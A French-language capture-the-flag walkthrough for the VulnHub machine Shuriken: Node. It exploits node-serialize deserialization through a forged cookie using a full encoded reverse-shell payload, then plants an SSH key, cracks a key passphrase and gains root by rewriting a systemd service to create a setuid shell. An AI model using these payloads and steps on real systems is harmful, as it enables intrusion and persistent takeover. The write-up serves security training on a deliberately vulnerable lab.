# Solution du CTF Shuriken: Node de VulnHub

[Shuriken: Node](https://vulnhub.com/entry/shuriken-node,628/) est un CTF créé par *TheCyb3rW0lf* et proposé sur VulnHub. L'objectif est comme souvent d'obtenir les droits root et récupérer le fameux flag.

```
Nmap scan report for 192.168.56.55
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8567c9bb4bec6875ea37b17442aa02a0 (RSA)
|   256 38499a8763f55b5fac0e705d687c63de (ECDSA)
|_  256 0b2259fb44eeb28fa575b245701ab9ec (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-title: Shuriken &ndash; Your reliable news source &ndash; Try Now!
```

On a affaire ici à un serveur basé sur Express et NodeJS. L'auteur du CTF laissait un indice dans la description du CTF :

> For the foothold, it's important to understand the technology behind the web app and how it handles user input.

On se rend sur la page du site qui ressemble à un blog comme il y en a des milliards.

Le seul lien valide pointe vers /login qui contient un formulaire pour s'authentifier. [Wapiti](https://wapiti-scanner.github.io/) est capable de trouver le formulaire en crawlant et de tester différentes attaques dessus mais le formulaire semble protégé contre tout type d'injection.

Je remarque que le site génère un cookie dans le navigateur. Le nom du cookie est `session` et sa valeur est la suivante :

`eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==`

ce qui se décode en base 64 comme ceci :

```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Le plus surprenant là dedans c'est sans doute l'absence de signature cryptographique normalement destinée à empécher des utilisateurs trop malins de forger leurs cookies.

Si on remplace Guest par Admin et que l'on re-encode le JSON pour l'injecter dans le cookie on obtient bien un message *Welcome, Admin* prouvant que ça a fonctionné mais aucune section privée du site n'apparait pour autant.

## Do you know what I mean ?

Ce type de technologie assez récente a généralement à faire face à des vulnérabilités de désérialisation. Un outil comme [ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization](https://github.com/frohoff/ysoserial) est souvent utilisé dans les CTFs pour les vulnérabilités de ce type. On va voir si le service NodeJS est touché par une faille de cette famille.

Ne connaissant pas trop comment tout cela fonctionne, je regarde d'abord si placer une opération Javascript dans le cookie permet d'avoir une interprétation quelconque :

```json
{"username":"ab"+"cd"}
```

Je n'obtiens pas un message *Welcome, abcd* mais une erreur de désérialisation :

```
SyntaxError: Unexpected token + in JSON at position 16
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/web/shuriken-node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/web/shuriken-node/server.js:16:24
    at Layer.handle [as handle_request] (/home/web/shuriken-node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/web/shuriken-node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/web/shuriken-node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/web/shuriken-node/node_modules/express/lib/router/layer.js:95:5)
    at /home/web/shuriken-node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/web/shuriken-node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/web/shuriken-node/node_modules/express/lib/router/index.js:275:10)
```

Je suis donc sur la bonne voie. Une recherche m'a mené sur cet article : [Node.js Deserialization Attack – Detailed Tutorial 2018 - Yeah Hub](https://www.yeahhub.com/nodejs-deserialization-attack-detailed-tutorial-2018/).

Il convient d'abord de générer un payload javascript qui déclenchera un reverse-shell. Le script [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) se base sur un template pour cela.

```shellsession
$ python2 nodejsshell.py 192.168.56.1 9999
[+] LHOST = 192.168.56.1
[+] LPORT = 9999
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,49,34,59,10,80,79,82,84,61,34,57,57,57,57,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Mais il ne suffit pas de passer ce code comme valeur pour la clé `username` du cookie. Il faut à la place que cette valeur correspond à une fonction sérialisée qui appelera notre code.

Pour cela je dois écrire le script suivant qui affichera le code sous forme sérialisée :

```js
var y = {                                                                                                              
username : function() { return eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,49,34,59,10,80,79,82,84,61,34,57,57,57,57,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10));}
}                                                                                                                      
var serialize = require('node-serialize');                                                                             
console.log("Serialized: \n" + serialize.serialize(y))
```

Il faut installer `node-serialize` via npm pour que le script fontionne normalement. Attention à mettre le code sur une seule ligne sinon des `\n` se retrouvent dans l'output et posent problème.

L'output généré ressemble à ceci :

```json
{"username":"_$$ND_FUNC$$_function() { return eval(...);}"}
```

C'est bien, mais on voit qu'il n'y a que la déclaration de fonction. La fonction n'est pas appelée dans le code.

C'est normal car si on l'appelle dans notre code JS çi dessus on sérialisera la valeur de retour de la fonction au lieu de la fonction elle-même !

Il faut par conséquent modifier le JSON après l'étape de sérialisation pour rajouter les parenthèses provoquant l'appel :

```json
{"username":"_$$ND_FUNC$$_function() { return eval(...);}()"}
```

On encode la totalité en base64 et on injecte le cookie dans le navigateur (j'utilise [EditThisCookie - Chrome Web Store](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg) qui fait très bien le taff).

Je recharge la page et le code est bien désérialisé par le serveur et exécuté :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.55.
Ncat: Connection from 192.168.56.55:40918.
Connected!
id
uid=1001(web) gid=1001(web) groups=1001(web)
pwd 
/home/web/shuriken-node
cd ..
ls -al
total 36
drwxr-xr-x 6 web  web  4096 Dec 10  2020 .
drwxr-xr-x 4 root root 4096 Dec  9  2020 ..
lrwxrwxrwx 1 root root    9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r-- 1 web  web   220 Dec  9  2020 .bash_logout
-rw-r--r-- 1 web  web  3771 Dec  9  2020 .bashrc
drwxrwxr-x 4 web  web  4096 Dec  9  2020 .npm
drwxrwxr-x 5 web  web  4096 Nov 14 16:52 .pm2
-rw-r--r-- 1 web  web   807 Dec  9  2020 .profile
drwxrwxr-x 5 web  web  4096 Dec  9  2020 shuriken-node
drwx------ 2 web  web  4096 Dec 10  2020 .ssh
cd .ssh
ls -al
total 12
drwx------ 2 web web 4096 Dec 10  2020 .
drwxr-xr-x 6 web web 4096 Dec 10  2020 ..
-rw-r--r-- 1 web web  222 Dec 10  2020 known_hosts
echo ssh-rsa ---snip ma clé publique ssh snip--- > authorized_keys
```

Je peux alors me connecter avec SSH ce qui sera moins galère si je dois reprendre un accès plus tard.

Je cherche les fichiers liés au second utilisateur présent sur le système :

```shellsession
web@shuriken-node:/home$ find / -user serv-adm -exec file {} \; 2> /dev/null 
/var/lib/lightdm-data/serv-adm: directory
/var/backups/ssh-backup.zip: Zip archive data, at least v2.0 to extract
/etc/systemd/system/shuriken-job.service: ASCII text
/etc/systemd/system/shuriken-auto.timer: ASCII text
/home/serv-adm: directory
```

On peut extraire la clé privée présente dans l'archive zip et ce sans avoir à extraire de mot de passe. La clé privée est par contre protégée par une passphrase. On va la casser avec *John the Ripper*.

```shell-session
$ ./john --wordlist=rockyou.txt /tmp/hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shuriken1995@    (/tmp/id_rsa)     
1g 0:00:00:01 DONE (2022-11-14 19:13) 0.7575g/s 2861Kp/s 2861Kc/s 2861KC/s shurke..shurik23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Une nouvelle conexion SSH plus tard et on a notre premier flag dans le fichier `user.txt` : `cef238d297752990f891a9a184488124`.

## Wakisashi

Maintenant voyons comment passer root :

```shellsession
serv-adm@shuriken-node:~$ sudo -l
Matching Defaults entries for serv-adm on shuriken-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-adm may run the following commands on shuriken-node:
    (ALL) NOPASSWD: /bin/systemctl start shuriken-auto.timer
    (ALL) NOPASSWD: /bin/systemctl stop shuriken-auto.timer
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
```

L'utilisateur peut démarrer avec les droits root le timer dont le contenu est le suivant :

```systemd
[Unit]
Description=Run Shuriken utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=shuriken-job.service

[Install]
WantedBy=basic.target
```

Il fait appel au service du même nom qui effectue un simple appel à `df` :

```systemd
[Unit]
Description=Logs system statistics to the systemd journal
Wants=shuriken-auto.timer

[Service]
# Gather system statistics
Type=oneshot
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Je remplace juste la ligne `ExecStart` de cette façon :

```systemd
ExecStart=/bin/bash -c "cp /bin/dash /tmp/gotroot; chmod 4755 /tmp/gotroot"
```

```shellsession
serv-adm@shuriken-node:~$ sudo /bin/systemctl start shuriken-auto.timer
serv-adm@shuriken-node:~$ ls -l /tmp/gotroot 
-rwsr-xr-x 1 root root 121432 Nov 14 19:21 /tmp/gotroot
serv-adm@shuriken-node:~$ /tmp/gotroot -p
# id
uid=1000(serv-adm) gid=1000(serv-adm) euid=0(root) groups=1000(serv-adm),24(cdrom)
# cd /root
# ls
root.txt
# cat root.txt


  _________.__                 .__ __                        _______             .___      
 /   _____/|  |__  __ _________|__|  | __ ____   ____   /\   \      \   ____   __| _/____  
 \_____  \ |  |  \|  |  \_  __ \  |  |/ // __ \ /    \  \/   /   |   \ /  _ \ / __ |/ __ \ 
 /        \|   Y  \  |  /|  | \/  |    <\  ___/|   |  \ /\  /    |    (  <_> ) /_/ \  ___/ 
/_______  /|___|  /____/ |__|  |__|__|_ \\___  >___|  / \/  \____|__  /\____/\____ |\___  >
        \/      \/                     \/    \/     \/              \/            \/    \/ 
                                                     ____
eb38a0b907da3d8b630688cb52b1b584                    /   /
                                                   /   /
                      __             .___  ____   /   /                                      
_______  ____   _____/  |_  ____   __| _/  \   \ /   /                                      
\_  __ \/  _ \ /  _ \   __\/ __ \ / __ |    \   Y   /                                       
 |  | \(  <_> |  <_> )  | \  ___// /_/ |     \     /                                        
 |__|   \____/ \____/|__|  \___  >____ |      \___/                                         
                               \/     \/     
=============================
Author: LoneW0lf
=============================
Previous machine in the series:
Shuriken: 1 - https://www.vulnhub.com/entry/shuriken-1,600/
=============================
```

C'était sympa d'exploiter une faille de désérialisation, ça change un peu des scénarios classiques :)

*Publié le 14 novembre 2022*
